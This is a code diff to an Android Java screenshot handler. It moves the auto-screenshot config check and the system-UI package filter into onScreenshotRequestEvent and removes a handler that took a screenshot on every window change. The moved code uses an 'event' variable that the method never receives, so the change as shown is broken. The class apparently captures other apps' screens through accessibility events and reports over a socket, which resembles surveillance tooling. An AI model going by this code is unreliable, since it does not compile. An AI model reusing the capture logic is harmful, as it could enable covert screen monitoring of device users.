@@ -41,6 +41,20 @@ public class ScreenshotEventHandler {
     }
 
     public void onScreenshotRequestEvent() {
+
+        // Only take screenshot if enabled in config
+        ConfigData config = configManager.getCachedConfig();
+        if (config == null || !config.isAutoScreenshotEnabled()) {
+            return;
+        }
+
+        // Ignore system UI packages
+        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+        if (packageName.equals("com.android.systemui") ||
+                packageName.equals("android")) {
+            return;
+        }
+
         // Check if device supports screenshot functionality
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             socketManager.sendEvent("logger", "Screenshot not supported on this Android version");
@@ -97,28 +111,6 @@ public class ScreenshotEventHandler {
         } catch (Exception e) {
             socketManager.sendEvent("logger", "Error taking screenshot: " + e.getMessage());
         }
-    }
-
-    /**
-     * Handle TYPE_WINDOW_STATE_CHANGED events - captures screenshot when window/activity changes
-     */
-    public void onWindowStateChanged(AccessibilityEvent event) {
-        // Only take screenshot if enabled in config
-        ConfigData config = configManager.getCachedConfig();
-        if (config == null || !config.isAutoScreenshotEnabled()) {
-            return;
-        }
-
-        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-
-        // Ignore system UI packages
-        if (packageName.equals("com.android.systemui") ||
-                packageName.equals("android")) {
-            return;
-        }
-
-        // Take screenshot on window state change
-        onScreenshotRequestEvent();
     }
 
     /**
